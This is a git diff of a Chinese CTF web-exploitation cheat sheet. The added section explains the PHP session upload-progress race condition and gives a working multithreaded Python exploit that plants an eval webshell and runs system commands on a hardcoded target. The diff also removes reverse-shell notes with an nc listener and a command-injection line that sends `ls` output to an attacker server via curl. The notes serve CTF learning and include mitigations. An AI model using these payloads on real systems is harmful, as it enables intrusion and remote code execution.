@@ -287,7 +287,7 @@ git show xxx
 使用方法
 ```bash
 git clone https://github.com/denny0223/scrabble.git
-./scrabble http://example.com/​
+./scrabble http://example.com/
 ```
 > 在 M1 Mac 中，/Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Git工具/scrabble 保留了副本
 
@@ -1048,7 +1048,7 @@ http://xxx/code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%C
 
 如果 system('cat flag.txt'); 不成功，可以尝试如 system('cat f*.txt');。（或者可以尝试直接在浏览器访问这个文件）
 
-#### 部分漏洞
+#### 其他漏洞
 
 ##### include() 漏洞
 
@@ -1065,6 +1065,105 @@ http://xxx/?p=GLOBALS
 在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将 `get_headers()` 与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对 `get_headers()` 的目标做出错误的假设，并可能将某些信息发送到错误的服务器。
 
 例如原地址 `http://node4.anna.nssctf.cn:28559/?url=http://www.ctfhub.com` 会被  `http://x/?url=http://127.0.0.1%00.ctfhub.com`  截断，而显示 `http://127.0.0.1` 的内容。
+
+##### strcmp
+
+- 不支持数组，遇到数组会直接返回0
+
+```
+?id[]=1
+```
+
+##### Session 条件竞争
+
+利用点：
+
+1.题目可以访问 `phpinfo()`
+
+2.phpinfo 中可以看到 `session.upload_progress` 开启
+
+3.需要能访问到 session 文件 `/tmp/sess_{sessid}` (可以通过 `include(file)` 来访问这个文件，示例代码的题目场景正是如此)
+
+然后尝试用session文件包含，一般利用GET传参将我们构造好的恶意代码传入session中的，但没有 GET 传参还能往 session 中写入代码吗？当然可以，php 5.4后添加了 session.upload_progress 功能，这个功能开启意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中，利用这个特性可以将恶意语句写入session文件。
+
+综上所述，
+
+目标环境开启了session.upload_progress.enable选项
+发送一个文件上传请求，其中包含一个文件表单和一个名字是 PHP_SESSION_UPLOAD_PROGRESS 的字段
+请求的Cookie中包含Session ID
+注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。
+
+网上大佬也给出了脚本实现，这里就不重新造轮子了，改写一下直接用：
+
+下面的代码跑通后，需要修改 **地址** 和 **session.post 的请求参数**（根据具体题目和后续返回的 flag 文件名修改）即可
+
+例题: https://www.ctfer.vip/problem/336
+
+```python
+import io
+
+import requests
+import threading  # 多线程
+
+from cffi.backend_ctypes import xrange
+
+sessid = '0'
+target = 'http://1.14.71.254:28592/' # 需要修改这个地址
+file = 'ph0ebus.txt'  # 上传文件名
+f = io.BytesIO(b'a' * 1024 * 50)  # 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长
+
+
+def write(session):
+    while True:
+        session.post(target, data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_GET["cmd"]);?>'},
+                     files={'file': (file, f)}, cookies={'PHPSESSID': sessid})
+
+
+def read(session):
+    while True:
+        resp = session.post(
+          	# 根据具体的题目修改 session.post 的请求参数，后续也要根据 ls 返回的内容修改 nssctfasdasdflag 字段
+          	# 此处 mode 参数是该代码审计题中的内容，实际只需要关注怎么访问到 session 存储的文件，即这里的 file 参数（这道题中是 include(file)）
+          	# 综上，此处只需要确保 /tmp/sess_{sessid}&cmd=system('cd /;ls;cat nssctfasdasdflag'); 被包含在 include() 中，或者可以直接通过 Web 访问这个文件(/tmp/sess_{sessid}) [简单讲，我们需要能访问到自己上传的 php session 文件]
+            f"{target}?mode=foo&file=/tmp/sess_{sessid}&cmd=system('cd /;ls;cat nssctfasdasdflag');")
+        if file in resp.text:
+            print(resp.text)
+            event.clear()
+        else:
+            print("[+]retry")
+            # print(resp.text)
+
+
+if __name__ == "__main__":
+    event = threading.Event()
+    with requests.session() as session:
+        for i in xrange(1, 30):  # 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好
+            threading.Thread(target=write, args=(session,)).start()
+            # target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()
+        for i in xrange(1, 30):
+            threading.Thread(target=read, args=(session,)).start()
+    event.set()
+```
+
+该漏洞的原理解释：PHP的Session条件竞争是一种攻击技术，利用了PHP会话管理机制中的漏洞。这种攻击利用了多线程或多进程环境下的竞争条件，通过同时发送多个请求来创建或修改会话数据，以实现绕过访问控制或执行未授权操作的目的。
+
+PHP的会话管理通常使用文件或数据库存储会话数据。当用户访问网站时，服务器会为其分配一个唯一的会话标识符（Session ID），并将会话数据与该标识符关联存储。在后续的请求中，服务器会根据会话标识符来检索和更新会话数据。
+
+在条件竞争攻击中，攻击者利用了会话数据的存储和访问过程中的时间差异。攻击者发送多个并发请求，每个请求都试图创建或修改会话数据。由于多线程或多进程环境中的竞争条件，这些请求可能会同时到达服务器，并在同一时间段内处理。
+
+攻击者的目标是通过竞争条件中的时间差异，使其中一个请求成功地修改了会话数据，而其他请求则未能成功。这样，攻击者可以绕过访问控制机制，例如通过修改会话中的权限或角色数据来提升其特权级别，或者执行其他未授权的操作。
+
+为了防止Session条件竞争攻击，开发人员应该采取一些措施，例如：
+
+1. 使用适当的并发控制机制，如互斥锁（Mutex）或原子操作，来保护会话数据的读写过程。
+2. 为会话数据存储选择合适的解决方案，如使用数据库而不是文件存储会话数据。
+3. 使用随机和复杂的会话标识符，增加攻击者猜测会话标识符的难度。
+4. 定期更新会话标识符，以减少攻击者成功的可能性。
+5. 对会话数据进行严格的输入验证和过滤，以防止注入攻击和其他安全漏洞。
+
+请注意，具体的攻击技术和防护措施可能因PHP版本、配置和应用程序实现的不同而有所差异。在实际开发和部署中，建议参考PHP官方文档和安全最佳实践来保护会话数据的安全性。
+
+**自己对上面解释的理解**：PHP 检测 Session 的机制是定期轮询检测，我们利用的就是这个检测空档，让我们自己上传的 session 不被立刻删除
 
 #### 弱类型(==判断) 
 
@@ -1403,46 +1502,6 @@ gopherus --exploit dmpmemcache
 
 ```
 gopherus --exploit smtp
-```
-
-
-
-#### 反弹 shell
-
-在攻击服务器上执行（如果使用的是公网，建议用搬瓦工服务器）
-
-```bash
-nc -nlvp 10200
-```
-
-监听 0.0.0.0 的 10200 端口
-
-找到靶机上可以请求 url 的注入点
-
-```
-?url=https://;curl http://攻击服务器地址:4567?`ls`
-# 前面的 https 是一道题中的条件，这里用了绕过 https
-
-# 通用写法如下
-?url=http://攻击服务器地址:4567?`ls`
-
-# 经过测试，该方法每次请求，都需要重启攻击服务器上的 tcp 连接，才能在下次请求正常收到信息
-```
-
-如果输出内容被后端限制了长度，可以这样测试 flag 的路径:
-
-```
-ls
-ls /f*
-cat /f*
-```
-
-#### 特殊函数的漏洞
-
-##### strcmp
-> 不支持数组，遇到数组会直接返回0
-```
-?id[]=1
 ```
 
 #### 函数或语法备忘
